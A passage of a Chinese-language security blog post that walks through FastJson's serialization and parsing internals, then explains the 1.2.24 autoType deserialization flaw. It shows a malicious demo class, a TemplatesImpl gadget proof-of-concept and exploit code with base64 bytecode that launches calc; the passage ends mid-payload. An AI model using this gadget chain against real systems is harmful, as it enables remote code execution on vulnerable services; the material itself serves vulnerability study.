<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> ObjectSerializer <span class="title">getObjectWriter</span><span class="params">(Class&lt;?&gt; clazz, <span class="keyword">boolean</span> create)</span> </span>&#123; <span class="comment">// Demo true</span></span><br><span class="line">    <span class="comment">// this.serializers = IdentityHashMao</span></span><br><span class="line">    ObjectSerializer writer = (ObjectSerializer)<span class="keyword">this</span>.serializers.get(clazz); </span><br><span class="line">    ClassLoader classLoader;</span><br><span class="line">    Iterator var5;</span><br><span class="line">    Object o;</span><br><span class="line">    AutowiredObjectSerializer autowired;</span><br><span class="line">    Iterator var8;</span><br><span class="line">    Type forType;</span><br><span class="line">    <span class="keyword">if</span> (writer == <span class="keyword">null</span>) &#123;</span><br><span class="line">        ……</span><br><span class="line"></span><br><span class="line">        writer = (ObjectSerializer)<span class="keyword">this</span>.serializers.get(clazz);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (writer == <span class="keyword">null</span>) &#123;</span><br><span class="line">       ……</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (writer == <span class="keyword">null</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (Map.class.isAssignableFrom(clazz)) &#123;</span><br><span class="line">            ……</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (!TimeZone.class.isAssignableFrom(clazz) &amp;&amp; !Entry.class.isAssignableFrom(clazz)) &#123;</span><br><span class="line">            <span class="keyword">if</span> (Appendable.class.isAssignableFrom(clazz)) &#123;</span><br><span class="line">                ……</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    String className = clazz.getName();</span><br><span class="line">                    ……</span><br><span class="line">                    <span class="keyword">if</span> (create) &#123; <span class="comment">// true</span></span><br><span class="line">                        <span class="keyword">this</span>.put((Type)clazz, (ObjectSerializer)<span class="keyword">this</span>.createJavaBeanSerializer(clazz));</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">this</span>.put((Type)clazz, (ObjectSerializer)CalendarCodec.instance);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">this</span>.put((Type)clazz, (ObjectSerializer)MiscCodec.instance);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        writer = (ObjectSerializer)<span class="keyword">this</span>.serializers.get(clazz);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> writer;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>write为<code>ASMSerializer_1_Demo</code>，其父类为<code>JavaBeanSerializer</code>，所以总的来说会去调用<code>JavaBeanSerializer#write</code></p>
<p><img src="https://img-blog.csdnimg.cn/45210954cef844409edbca74437b48de.png" alt="img"></p>
<p>最后调用<code>ObjectSerializer#write</code>，之后实现调用getter，</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">void</span> <span class="title">write</span><span class="params">(Object object)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (object == <span class="keyword">null</span>) &#123;</span><br><span class="line">        <span class="keyword">this</span>.out.writeNull();</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        Class&lt;?&gt; clazz = object.getClass();</span><br><span class="line">        ObjectSerializer writer = <span class="keyword">this</span>.getObjectWriter(clazz);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            writer.write(<span class="keyword">this</span>, object, (Object)<span class="keyword">null</span>, (Type)<span class="keyword">null</span>, <span class="number">0</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException var5) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> JSONException(var5.getMessage(), var5);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>并且在<code>SerializeWriter</code>将从getter中获取到的field，JSON序列化之后写入buf中</p>
<p><img src="https://img-blog.csdnimg.cn/6809e48d8c43428eb8f8d0f0195aec57.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAYW1ldXU=,size_20,color_FFFFFF,t_70,g_se,x_16"></p>
<h4 id="反序列化-1"><a href="#反序列化-1" class="headerlink" title="反序列化"></a>反序列化</h4><h5 id="JSON-parse"><a href="#JSON-parse" class="headerlink" title="JSON.parse"></a>JSON.parse</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;&quot;@type&quot;:&quot;FastJson.Demo&quot;,&quot;id&quot;:&quot;1&quot;,&quot;name&quot;:&quot;ameuu&quot;,&quot;score&quot;:0,&quot;sex&quot;:&quot;F&quot;&#125;</span><br></pre></td></tr></table></figure>

<p>先利用parse创建对象，创建了<code>DefaultJSONParser</code>对象，根据字符串开头为<code>&#123;</code>或者<code>[</code>给token赋值，并next下移判断字符    </p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title">parse</span><span class="params">(String text, <span class="keyword">int</span> features)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (text == <span class="keyword">null</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        DefaultJSONParser parser = <span class="keyword">new</span> DefaultJSONParser(text, ParserConfig.getGlobalInstance(), features);</span><br><span class="line">        Object value = parser.parse();</span><br><span class="line">        parser.handleResovleTask(value);</span><br><span class="line">        parser.close();</span><br><span class="line">        <span class="keyword">return</span> value;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>DefaultJSONParser#parse</code>中创建了<code>JSONObject</code>对象，并在parseObject进行解析</p>
<p><img src="https://img-blog.csdnimg.cn/608e556c95f246cfb7aa1ba157d152f4.png" alt="img"></p>
<p>因为token已经变成12，直接进入else。利用死循环（300+行😭）对字符进行解析</p>
<p><code>skipWhitespace</code>，当字符为<code> |\r|\n|\t|\f|\b|</code>的时候不会解析或者当字符串为<code>/**/</code>注释的时候也不会解析。当<code>lexer.isEnabled(Feature.AllowArbitraryCommas)</code>成立的时候，连续的逗号也不会被解析</p>
<p><img src="https://img-blog.csdnimg.cn/ca13e25d6e6941d0b1bf019091b92c64.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAYW1ldXU=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="img"></p>
<p><code>JSONLexerBase#scanSymbol</code>把两个相邻的并且没用被<code>\</code>转义的quote之间的字符串截取出来。</p>
<p>就比如根据我前面传进去的，最先得到的是<code>@type</code></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">final</span> String <span class="title">scanSymbol</span><span class="params">(SymbolTable symbolTable, <span class="keyword">char</span> quote)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> hash = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">this</span>.np = <span class="keyword">this</span>.bp;</span><br><span class="line">    <span class="keyword">this</span>.sp = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">boolean</span> hasSpecial = <span class="keyword">false</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span>(<span class="keyword">true</span>) &#123;</span><br><span class="line">        <span class="keyword">char</span> chLocal = <span class="keyword">this</span>.next();</span><br><span class="line">        <span class="keyword">if</span> (chLocal == quote) &#123;  <span class="comment">// 如果前后字符相等</span></span><br><span class="line">            <span class="keyword">this</span>.token = <span class="number">4</span>;</span><br><span class="line">            String value;</span><br><span class="line">            <span class="keyword">if</span> (!hasSpecial) &#123; </span><br><span class="line">                <span class="keyword">int</span> offset;</span><br><span class="line">                <span class="keyword">if</span> (<span class="keyword">this</span>.np == -<span class="number">1</span>) &#123;</span><br><span class="line">                    offset = <span class="number">0</span>;</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    offset = <span class="keyword">this</span>.np + <span class="number">1</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                value = <span class="keyword">this</span>.addSymbol(offset, <span class="keyword">this</span>.sp, hash, symbolTable);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                value = symbolTable.addSymbol(<span class="keyword">this</span>.sbuf, <span class="number">0</span>, <span class="keyword">this</span>.sp, hash);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">this</span>.sp = <span class="number">0</span>;</span><br><span class="line">            <span class="keyword">this</span>.next(); <span class="comment">// 继续取下一个字符</span></span><br><span class="line">            <span class="keyword">return</span> value; <span class="comment">// 返回两个quote之间的字符串</span></span><br><span class="line">        &#125;</span><br><span class="line">        ……</span><br><span class="line">        <span class="keyword">if</span> (chLocal == <span class="string">&#x27;\\&#x27;</span>) &#123;</span><br><span class="line">            ……</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            hash = <span class="number">31</span> * hash + chLocal;</span><br><span class="line">            <span class="keyword">if</span> (!hasSpecial) &#123;</span><br><span class="line">                ++<span class="keyword">this</span>.sp;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="keyword">this</span>.sp == <span class="keyword">this</span>.sbuf.length) &#123;</span><br><span class="line">                <span class="keyword">this</span>.putChar(chLocal);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">this</span>.sbuf[<span class="keyword">this</span>.sp++] = chLocal;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>SymbolTable#addSymbol</code>比较是否相等，返回字符串，这里返回的是<code>@type</code></p>
<p><img src="https://img-blog.csdnimg.cn/a2e739f61da747c1a49c57f21702c6c8.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAYW1ldXU=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="img"></p>
<p><code>DefaultJSONParser#parseObject</code>，如果存在标识<code>@type</code>，且禁用了特殊字符检查，就会继续获取下一个<code>&quot;&quot;</code>之间的字符串（即我们的类名）并返回给<code>ref</code>，并利用<code>TypeUtils#loadClass</code>加载类</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">public static String DEFAULT_TYPE_KEY = &quot;@type&quot;;</span><br></pre></td></tr></table></figure>

<p><img src="https://img-blog.csdnimg.cn/6874875a0b9e4f50a8a78745b6a6115b.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAYW1ldXU=,size_20,color_FFFFFF,t_70,g_se,x_16"></p>
<p>在<code>ParseConfig#getDesearilizer</code>中获取反序列化对象，并执行反序列化方法，而对对象也进行了黑名单过滤</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="keyword">this</span>.denyList.length; ++i) &#123;</span><br><span class="line">    String deny = <span class="keyword">this</span>.denyList[i];</span><br><span class="line">    <span class="keyword">if</span> (className.startsWith(deny)) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> JSONException(<span class="string">&quot;parser deny : &quot;</span> + className);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>跟进到<code>ParseConfig#createJavaBeanDesrializer</code>，其中创建了<code>JavaBeanDeserializer</code></p>
<p><img src="https://img-blog.csdnimg.cn/bc3f9debc3e049bd855b08ec489a76d5.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAYW1ldXU=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="img"></p>
<p><img src="https://img-blog.csdnimg.cn/bc0962421725486ea992d3c58d495150.png"></p>
<p>在<code>JavaBeanInfo#build</code>中获取<code>clazz</code>的属性、方法和构造器</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Class&lt;?&gt; builderClass = getBuilderClass(jsonType);</span><br><span class="line">Field[] declaredFields = clazz.getDeclaredFields();</span><br><span class="line">Method[] methods = clazz.getMethods();</span><br><span class="line">Constructor&lt;?&gt; defaultConstructor = getDefaultConstructor(builderClass == <span class="keyword">null</span> ? clazz : builderClass);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (defaultConstructor != <span class="keyword">null</span>) &#123; <span class="comment">// 获得访问权限</span></span><br><span class="line">    TypeUtils.setAccessible(defaultConstructor);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>将符合条件的setter和getter添加进<code>fieldList</code>中</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (methodName.length() &gt;= <span class="number">4</span> &amp;&amp; !Modifier.isStatic(method.getModifiers()) &amp;&amp; (method.getReturnType().equals(Void.TYPE) || method.getReturnType().equals(method.getDeclaringClass()))) &#123; <span class="comment">// 如果名字长度大于等于4 不是静态方法 返回值为空或者为其他类型</span></span><br><span class="line">    Class&lt;?&gt;[] types = method.getParameterTypes(); <span class="comment">// 参数类型</span></span><br><span class="line">    <span class="keyword">if</span> (types.length == <span class="number">1</span>) &#123; <span class="comment">// 参数个数为1</span></span><br><span class="line">        …… </span><br><span class="line">        <span class="keyword">if</span> (methodName.startsWith(<span class="string">&quot;set&quot;</span>)) &#123; <span class="comment">// 如果方法以 set开始</span></span><br><span class="line">            ……</span><br><span class="line">                    <span class="keyword">if</span> (fieldAnnotation.name().length() != <span class="number">0</span>) &#123;</span><br><span class="line">                        propertyName = fieldAnnotation.name();</span><br><span class="line">                        add(fieldList, <span class="keyword">new</span> FieldInfo(propertyName, method, field, clazz, type, ordinal, serialzeFeatures, parserFeatures, annotation, fieldAnnotation, (String)<span class="keyword">null</span>));</span><br><span class="line">                        <span class="keyword">continue</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">            ……</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (propertyNamingStrategy != <span class="keyword">null</span>) &#123;</span><br><span class="line">                propertyName = propertyNamingStrategy.translate(propertyName);</span><br><span class="line">            &#125;</span><br><span class="line">            add(fieldList, <span class="keyword">new</span> FieldInfo(propertyName, method, field, clazz, type, ordinal, serialzeFeatures, parserFeatures, annotation, fieldAnnotation, (String)<span class="keyword">null</span>));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (methodName.length() &gt;= <span class="number">4</span> &amp;&amp; !Modifier.isStatic(method.getModifiers()) &amp;&amp; methodName.startsWith(<span class="string">&quot;get&quot;</span>) &amp;&amp; Character.isUpperCase(methodName.charAt(<span class="number">3</span>)) &amp;&amp; method.getParameterTypes().length == <span class="number">0</span> &amp;&amp; (Collection.class.isAssignableFrom(method.getReturnType()) || Map.class.isAssignableFrom(method.getReturnType()) || AtomicBoolean.class == method.getReturnType() || AtomicInteger.class == method.getReturnType() || AtomicLong.class == method.getReturnType())) &#123;</span><br><span class="line">    <span class="comment">// 方法名长度大于4 非静态方法 以get为开头  第四位字符大写 无参数 返回值类型为结合、布尔、整型或者长整型</span></span><br><span class="line">    JSONField annotation = (JSONField)method.getAnnotation(JSONField.class);</span><br><span class="line">    <span class="keyword">if</span> (annotation == <span class="keyword">null</span> || !annotation.deserialize()) &#123;</span><br><span class="line">        ……</span><br><span class="line">        <span class="keyword">if</span> (fieldInfo == <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (propertyNamingStrategy != <span class="keyword">null</span>) &#123;</span><br><span class="line">                propertyName = propertyNamingStrategy.translate(propertyName);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            add(fieldList, <span class="keyword">new</span> FieldInfo(propertyName, method, (Field)<span class="keyword">null</span>, clazz, type, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, annotation, (JSONField)<span class="keyword">null</span>, (String)<span class="keyword">null</span>));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>build结束之后会实例化一个<code>JavaBeanInfo</code>。</p>
<p><code>ParseConfig#createJavaBeanDesrializer</code>在build之后调用了<code>ASMDeserializerFactory#createJavaBeanDesrializer</code>，在这里将字节码放入数组中，并通过<code>defineClass</code>和<code>Construct</code>创建一个反序列化类，并未每个属性创建<code>FieldDeserializer</code>，为之后的反序列化做准备</p>
<p><img src="https://img-blog.csdnimg.cn/0a30c03044884536b418ead3e972f7d4.png" alt="img"></p>
<p><img src="https://img-blog.csdnimg.cn/415f69ae3eff45f5846f13bf55d61863.png" alt="img"></p>
<p>在<code>JavaBeanDeserializer#deserialize</code>中判断是否只有get，如果不是则直接调用了<code>fieldDeser.setValue</code>实则为<code>FieldDeserializer#setValue</code></p>
<p><img src="https://img-blog.csdnimg.cn/1fd2f20f5ca04b5186ed524b63e76e36.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAYW1ldXU=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="img"></p>
<p>实现调用setter</p>
<p><img src="https://img-blog.csdnimg.cn/90282958667f4dc383cc2148c64bc6bb.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAYW1ldXU=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="img"></p>
<h4 id="小结："><a href="#小结：" class="headerlink" title="小结："></a>小结：</h4><p>在分析<code>JSON.parse</code>的时候可以知道：</p>
<p>调用<code>setter</code>满足的条件：</p>
<ul>
<li>方法名长度大于4并且以set开始</li>
<li>不是静态方法</li>
<li>返回值为空或者当前类</li>
<li>参数个数为1</li>
</ul>
<p>调用<code>getter</code>满足的条件：</p>
<ul>
<li>方法名长度大于4且以get开始</li>
<li>不是静态方法</li>
<li>返回值为集合等</li>
<li>无参数</li>
<li>第四个字符是大写的</li>
</ul>
<h3 id="FastJson反序列化漏洞"><a href="#FastJson反序列化漏洞" class="headerlink" title="FastJson反序列化漏洞"></a>FastJson反序列化漏洞</h3><h4 id="1-2-24"><a href="#1-2-24" class="headerlink" title="1.2.24"></a>1.2.24</h4><blockquote>
<p>由于version 1.2.24默认开启autoType，使得攻击者可以控制@type后面的类，而fastjson会根据json字符串中的@type自动选择反序列化的类，并自动调用类中的get和set方法，如果这些方法存在漏洞，就可以恶意利用了</p>
</blockquote>
<h5 id="Demo"><a href="#Demo" class="headerlink" title="Demo"></a>Demo</h5><p>就比如我们创建一个恶意类：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> FastJson;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">FJDemo</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">FJDemo</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.name = <span class="string">&quot;calc&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setName</span><span class="params">(String name)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getName</span><span class="params">()</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">        Runtime.getRuntime().exec(name);</span><br><span class="line">        <span class="keyword">return</span> name;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>将他序列化（当然序列化的时候发现也会调用啦</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;&quot;@type&quot;:&quot;FastJson.FJDemo&quot;,&quot;name&quot;:&quot;calc&quot;&#125;</span><br></pre></td></tr></table></figure>

<p>反序列化：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Deserialize</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        String serialize = <span class="string">&quot;&#123;\&quot;@type\&quot;:\&quot;FastJson.FJDemo\&quot;,\&quot;name\&quot;:\&quot;calc\&quot;&#125;&quot;</span>;</span><br><span class="line">        JSON.parseObject(serialize);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://img-blog.csdnimg.cn/b6124978153544859fc38a40250e6d9e.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAYW1ldXU=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="img"></p>
<h5 id="TemplatesImpl"><a href="#TemplatesImpl" class="headerlink" title="TemplatesImpl"></a>TemplatesImpl</h5><p>POC:</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line"> <span class="string">&quot;@type&quot;</span>: <span class="string">&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&quot;</span>,</span><br><span class="line"> <span class="string">&quot;_bytecodes&quot;</span>: [</span><br><span class="line"><span class="string">&quot;……&quot;</span> <span class="comment">// base64加密的字节码</span></span><br><span class="line"> ],</span><br><span class="line"> <span class="string">&quot;_name&quot;</span>: <span class="string">&quot;aaa&quot;</span>,</span><br><span class="line"> <span class="string">&quot;_tfactory&quot;</span>: &#123;&#125;,</span><br><span class="line"> <span class="string">&quot;_outputProperties&quot;</span>: &#123;&#125;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure>

<blockquote>
<p>1.这里不要忘了前面讲到TemplatesImpl动态加载字节码的时候，类要继承<code>com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet</code></p>
<p>2.这里把exec放在set方法中没有执行成功</p>
</blockquote>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> FastJson;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.DOM;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.TransletException;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.serializer.SerializationHandler;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">FJDemo</span> <span class="keyword">extends</span> <span class="title">AbstractTranslet</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">FJDemo</span><span class="params">()</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        Runtime.getRuntime().exec(<span class="string">&quot;calc&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">transform</span><span class="params">(DOM document, SerializationHandler[] handlers)</span> <span class="keyword">throws</span> TransletException </span>&#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">transform</span><span class="params">(DOM document, DTMAxisIterator iterator, SerializationHandler handler)</span> <span class="keyword">throws</span> TransletException </span>&#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setName</span><span class="params">(String name)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getName</span><span class="params">()</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        FJDemo fjDemo = <span class="keyword">new</span> FJDemo();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>exp：</p>
<blockquote>
<p>TemplatesImpl Gadget重点在于<code>_bytecodes</code>和<code>_outputProperties</code>，而TemplatesImpl中也存在大量private的属性没有setter或者getter，所以要设置Feature.SupportNonPublicField=true</p>
</blockquote>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> FastJson;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.parser.Feature;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Deserialize</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">        String str = <span class="string">&quot;&#123;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot; \&quot;@type\&quot;: \&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl\&quot;,\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot; \&quot;_bytecodes\&quot;: [\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;\&quot;yv66vgAAADQALgoACAAeCgAfACAIACEKAB8AIgkABgAjBwAkCgAGAB4HACUBAARuYW1lAQASTGphdmEvbGFuZy9TdHJpbmc7AQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEACkV4Y2VwdGlvbnMHACYBAAl0cmFuc2Zvcm0BAHIoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007W0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7KVYHACcBAKYoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvZHRtL0RUTUF4aXNJdGVyYXRvcjtMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWAQAHc2V0TmFtZQEAFShMamF2YS9sYW5nL1N0cmluZzspVgEAB2dldE5hbWUBABQoKUxqYXZhL2xhbmcvU3RyaW5nOwcAKAEABG1haW4BABYoW0xqYXZhL2xhbmcvU3RyaW5nOylWAQAKU291cmNlRmlsZQEAC0ZKRGVtby5qYXZhDAALAAwHACkMACoAKwEABGNhbGMMACwALQwACQAKAQAPRmFzdEpzb24vRkpEZW1vAQBAY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL3J1bnRpbWUvQWJzdHJhY3RUcmFuc2xldAEAE2phdmEvbGFuZy9FeGNlcHRpb24BADljb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvVHJhbnNsZXRFeGNlcHRpb24BABNqYXZhL2lvL0lPRXhjZXB0aW9uAQARamF2YS9sYW5nL1J1bnRpbWUBAApnZXRSdW50aW1lAQAVKClMamF2YS9sYW5nL1J1bnRpbWU7AQAEZXhlYwEAJyhMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9Qcm9jZXNzOwAhAAYACAAAAAEAAgAJAAoAAAAGAAEACwAMAAIADQAAAC4AAgABAAAADiq3AAG4AAISA7YABFexAAAAAQAOAAAADgADAAAADgAEAA8ADQAQAA8AAAAEAAEAEAABABEAEgACAA0AAAAZAAAAAwAAAAGxAAAAAQAOAAAABgABAAAAFQAPAAAABAABABMAAQARABQAAgANAAAAGQAAAAQAAAABsQAAAAEADgAAAAYAAQAAABoADwAAAAQAAQATAAEAFQAWAAEADQAAACIAAgACAAAABiortQAFsQAAAAEADgAAAAoAAgAAAB0ABQAeAAEAFwAYAAIADQAAAB0AAQABAAAABSq0AAWwAAAAAQAOAA